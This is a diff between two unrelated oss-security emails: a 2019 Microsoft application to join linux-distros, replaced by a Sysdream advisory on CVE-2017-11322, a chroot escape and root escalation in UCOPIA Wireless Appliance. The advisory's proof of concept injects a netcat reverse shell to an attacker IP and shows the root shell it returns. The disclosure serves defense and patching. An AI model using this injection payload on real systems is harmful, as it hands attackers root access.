@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5356" "Wednesday" "26" "June" "2019" "10:13:58" "-0400" "Sasha Levin" "sashal@kernel.org" "<20190626141358.GK7898@sasha-vm>" "119" "[oss-security] linux-distros membership application - Microsoft" "^Cc:" nil nil "6" "2019062614:13:58" "[oss-security] linux-distros membership application - Microsoft" (number mark "        sashal@kerne Jun 26  119/5356  " thread-indent "\"[oss-security] linux-distros membership application - Microsoft\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] linux-distros membership application - Microsoft" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3951" "Friday" "29" "September" "2017" "15:02:24" "+0200" "Sysdream Labs" "labs@sysdream.com" "<0495fde6-eee0-e1e3-a58d-dc3fe4dcebf1@sysdream.com>" "132" "[oss-security] [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation" nil nil nil "9" "2017092913:02:24" "[oss-security] [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation" (number mark "U       labs@sysdrea Sep 29  132/3951  " thread-indent "\"[oss-security] [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 26249 invoked by uid 550); 26 Jun 2019 15:10:18 -0000
+Received: (qmail 19715 invoked by uid 550); 29 Sep 2017 13:02:39 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,142 +11,160 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 26275 invoked from network); 26 Jun 2019 14:14:11 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
-	s=default; t=1561558439;
-	bh=j9mr3a/ItbToPSJ7M2Ie7Ol2PtLbPn7u4R9MoCd+jhE=;
-	h=Date:From:To:Cc:Subject:From;
-	b=n4rnuh+C64XeD+omBfRGQ+VPQkLskF6b80kyySvuYi6bO17i+Y0QM9YpeRjzwOAMA
-	 YsIdt5sVqFLb/VmGa2DEg46357IZkXwdKMibHZpiCiM4f3I1NLnfeAxHo/QQPRaJ+U
-	 u4ooiEsxMCmP1qpFAWtRP58DTxh5iIZMt8WxQN9o=
-Message-ID: <20190626141358.GK7898@sasha-vm>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Disposition: inline
-User-Agent: Mutt/1.10.1 (2018-07-13)
-Cc: gregkh@linuxfoundation.org
-Date: Wed, 26 Jun 2019 10:13:58 -0400
-From: Sasha Levin <sashal@kernel.org>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] linux-distros membership application - Microsoft
-To: oss-security@lists.openwall.com
+Received: (qmail 19662 invoked from network); 29 Sep 2017 13:02:38 -0000
+DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com ED4A61A1434
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
+	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1506690145;
+	bh=4B5Z70ETvEb+v/KMEyzYV+PTiUwqanvTk0rKIm5PoRQ=;
+	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
+	b=PooyEqQwtcVGhZxYrtZ3x0qfKkeSJjmCXDhqRNiu+6jDkS3PF3aduE5IWMWkyNaW6
+	 Y4+CY9uOhzb9Odo4SGwoOiF0Kbfnc3uzr+rXLRneeaPDpIAD3RUMiiizvdRSB0/s0Q
+	 Ah2i1kDzcaQkXPRINAzC4dDufmP/5bfRh7LFZgRY=
+X-Virus-Scanned: amavisd-new at sysdream.com
+To: fulldisclosure@seclists.org
+Cc: oss-security@lists.openwall.com
+From: Sysdream Labs <labs@sysdream.com>
+Message-ID: <0495fde6-eee0-e1e3-a58d-dc3fe4dcebf1@sysdream.com>
+Date: Fri, 29 Sep 2017 15:02:24 +0200
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.2.1
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="Tn7teOIwmkTfkeDD97MUh8LF8aa31ivVA"
+Subject: [oss-security] [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges
+ Escalation
 
-> 1. Be an actively maintained Unix-like operating system distro with
-> substantial use of Open Source components
+--Tn7teOIwmkTfkeDD97MUh8LF8aa31ivVA
+Content-Type: multipart/mixed; boundary="xTibcxPHvN39WJvHmHECW1OM6pGsQG2Oc";
+ protected-headers="v1"
+From: Sysdream Labs <labs@sysdream.com>
+To: fulldisclosure@seclists.org
+Cc: oss-security@lists.openwall.com
+Message-ID: <0495fde6-eee0-e1e3-a58d-dc3fe4dcebf1@sysdream.com>
+Subject: [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges
+ Escalation
 
-Microsoft provides several distro-like builds which are not derivative
-of an existing distribution that are based on open source components:
+--xTibcxPHvN39WJvHmHECW1OM6pGsQG2Oc
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
+Content-Transfer-Encoding: quoted-printable
 
- - Azure Sphere
-   (https://azure.microsoft.com/en-us/services/azure-sphere/): This
-   Linux-based IoT device provides, among various things, security
-   updates to deployed IoT devices. As the project is about to step out
-   of public preview into the GA stage, we expect millions of these
-   devices to be publicly used.
+# [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation
 
- - Windows Subsystem for Linux v2
-   (https://devblogs.microsoft.com/commandline/wsl-2-is-now-available-in-windows-insiders/):
-   A Linux based distro that runs as a virtual machine on top of Windows
-   hosts. WSL2 is currently available for public preview and scheduled
-   for GA early 2020.
+## Asset description
 
- - Products such as Azure HDInsight
-   (https://azure.microsoft.com/en-us/free/hdinsight) and the Azure
-   Kubernetes Service
-   (https://azure.microsoft.com/en-us/services/kubernetes-service/)
-   provide public access to a Linux based distribution.
+UCOPIA solutions bring together a combination of software, appliance and cl=
+oud services serving small to large customers.
 
-> 2. Have a userbase not limited to your own organization
+More than 12,000 UCOPIA solutions are deployed and maintained by UCOPIA exp=
+ert partners all over the world.
 
-Microsoft customers have millions of cores running the various workloads
-described above.
+The affected asset in this report is a WiFi management appliance.
 
-> 3. Have a publicly verifiable track record, dating back at least 1
-> year and continuing to present day, of fixing security issues
-> (including some that had been handled on (linux-)distros, meaning that
-> membership would have been relevant to you) and releasing the fixes
-> within 10 days (and preferably much less than that) of the issues
-> being made public (if it takes you ages to fix an issue, your users
-> wouldn't substantially benefit from the additional time, often around
-> 7 days and sometimes up to 14 days, that list membership could give
-> you).
+## Vulnerability
 
-Microsoft has decades long history of addressing security issues via
-MSRC (https://www.microsoft.com/en-us/msrc). While we are able to
-quickly (<1-2 hours) create a build to address disclosed security
-issues, we require extensive testing and validation before we make these
-builds public. Being members of this mailing list would provide us the
-additional time we need for extensive testing.
+CHROOT escape and privileges escalation.
 
-> 4. Not be (only) downstream or a rebuild of another distro (or else we
-> need convincing additional justification of how the list membership
-> would enable you to release fixes sooner, presumably not relying on
-> the upstream distro having released their fixes first?)
+**Threat**
 
-None of our builds are based on an existing distribution. For few of
-these workloads we have a very custom kernel and userspace (such as for
-Azure Sphere), while some share a more conventional kernel/userspace
-configuration.
+Improper sanitization of system commands in the chroothole_client executabl=
+e in UCOPIA Wireless Appliance, prior to 5.1.8, allows local attackers to e=
+levate privileges to root user and escape from the *chroot*.
 
-> 5. Be a participant and preferably an active contributor in relevant
-> public communities (most notably, if you're not watching for issues
-> being made public on oss-security, which are a superset of those that
-> had been handled on (linux-)distros, then there's no valid reason for
-> you to be on (linux-)distros)
+**CVE ID**: CVE-2017-11322
 
-We follow closely public discussions with regards to security issues
-that would affect us. While there was only a minor contribution back to
-these lists mostly as we did not have any value to add back.
+**Access Vector**: local
 
-During past years I've reported multiple security issues which were
-assigned CVEs.
+**Security Risk**: high
 
-> 6. Accept the list policy (see above)
+**Vulnerability**: CWE-78
 
-We accept the list's policy.
+**CVSS Base Score**: 8.2 (High)
 
-> 7. Be able and willing to contribute back (see above), preferably in
-> specific ways announced in advance (so that you're responsible for a
-> specific area and so that we know what to expect from which member),
-> and demonstrate actual contributions once you've been a member for a
-> while
+**CVSS Vector**: CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
 
-We understand this need and will be contributing back. Looking at the
-list of vacant positions I can suggest the following, but I suspect that
-existing list members will have better suggestions.
+### Proof of Concept: chroot escape / privileges escalation
 
-Technical:
+The **chroothole_client** binary is used by the appliance to run programs o=
+utside the *chroot*, as the **root** user.
 
-3. Review and/or test the proposed patches and point out potential
-issues with them (such as incomplete fixes for the originally reported
-issues, additional issues you might notice, and newly introduced bugs),
-and inform the list of the work done even if no issues were encountered
-- primary: Amazon, backup: vacant
+Because of an improper sanitization of system commands, we managed to gain =
+a complete **root** access to the appliance, outside the *chroot*.
 
-Administrative:
+```
+$ chroothole_client '/usr/sbin/status'
+is not running ... failed !
+$ chroothole_client '/usr/sbin/status $(which nc)'
+/bin/nc is not running ... failed!
+$ chroothole_client '/usr/sbin/status $(nc 10.0.0.125 4444 -e /bin/sh)'
+```
 
-3. Evaluate if the issue (or one of the issues) is effectively already
-public (e.g., a fix is committed upstream with a descriptive message)
-or/and is low severity and thus the report (or its portion pertaining to
-the issue) should be made public right away for one or both of these
-reasons, get a few other list members to confirm this understanding, and
-if there are no objections then communicate this strong preference to
-the reporter - primary: CloudLinux, backup: vacant
+Attacker terminal :
 
-> 8. Be able and willing to handle PGP-encrypted e-mail
+```
+$ ncat -lvp 4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.0.0.1:49156.
+whoami
+root
+```
 
-I am able and willing to handle PGP-encrypted e-mail.
+## Solution
 
-> 9. Have someone already on the private list, or at least someone else
-> who has been active on oss-security for years but is not affiliated
-> with your distro nor your organization, vouch for at least one of the
-> people requesting membership on behalf of your distro (then that one
-> vouched-for person will be able to vouch for others on your team, in
-> case you'd like multiple people subscribed)
+Update to UCOPIA 5.1.8
 
-Greg Kroah-Hartman <gregkh@linuxfoundation.org> would vouch for me
-(Sasha Levin <sashal@kernel.org>).
+## Timeline (dd/mm/yyyy)
 
---
-Thanks,
-Sasha
+* 08/03/2017 : Vulnerability discovery.
+* 03/05/2017 : Initial contact.
+* 10/05/2017 : GPG Key exchange.
+* 10/05/2017 : Advisory sent to vendor.
+* 17/05/2017 : Request for feedback.
+* 22/05/2017 : Vendor acknowledge the vulnerabilities.
+* 21/06/2017 : Sysdream Labs request for an ETA, warning for public disclos=
+ure.
+* 21/06/2017 : Vendor say that the UCOPIA 5.1.8 fixes the issue.
+* 29/09/2017 : Public disclosure.
+
+## Credits
+
+* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
+
+--=20
+SYSDREAM Labs <labs@sysdream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+--xTibcxPHvN39WJvHmHECW1OM6pGsQG2Oc--
+
+--Tn7teOIwmkTfkeDD97MUh8LF8aa31ivVA
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEER9HhJMQ++ZIqLhVRjrSM2dWyWaEFAlnORGAACgkQjrSM2dWy
+WaEWZRAAoOqInEXptyR3UbHOQ+1uFkVZ11MfLLcmiGD7agwESIdXZNV9LZCEUoSO
+6K+KvTHzOBe8ZRcKC7D5WSHJv77mLMOZ2XidQnj1pmRCqJSCwdCcuoNFd3HJdy1U
+8BSCyrJl8Xl5WlfFMzg8ph8n05hQi9Fu23LS+Da5gqjG8VMYOmqUaFbfBFHl6gc1
+6DofU+0TmqRLKgkrLcX1BnwLTfY5d+yODbHn01QgiGvgt7PTGBBF2eTmzXrPki8F
+v3A2XnryloIqgqoz8v6hfIDPmsWIfkKCH2ClMSbdMIDhtpY6j0bC/+r9KZ/EsAWU
+c7AxjrXLFbxZPG7NkEhqjpdVh4a1wPho3UPuH3GWS4HWR2z7iMBNI2Qr98wG8Ypc
+bmSrSjAItFxxUrGiPgG5NMyN19uDzukoLzzHiV31zPqYnIkaZg89GSJ4sn1XHEJ6
+nq4X5mQjAeKrIuRMTk8N6im7Ao87r6Cq0i0BA3jeelDDN+NCZwUkSU7g2pFCpZkk
+DSDodwxT9VGMHUoPVcmHaEvlPHNkxyoFdG1c0RxXvY/A4n/b1g4xnEI/wvdB9ail
+Ug24HDId8hNCn7t9rZsqpAfmmlHQAOTUK7dj93Fw6FOFaceguEYPuBJNoiyyWI9r
+NgtHqtNpg6aSwLbfirtQUOvsbhPDNtaURIjkmcwrup/keDsKNAg=
+=HGjQ
+-----END PGP SIGNATURE-----
+
+--Tn7teOIwmkTfkeDD97MUh8LF8aa31ivVA--
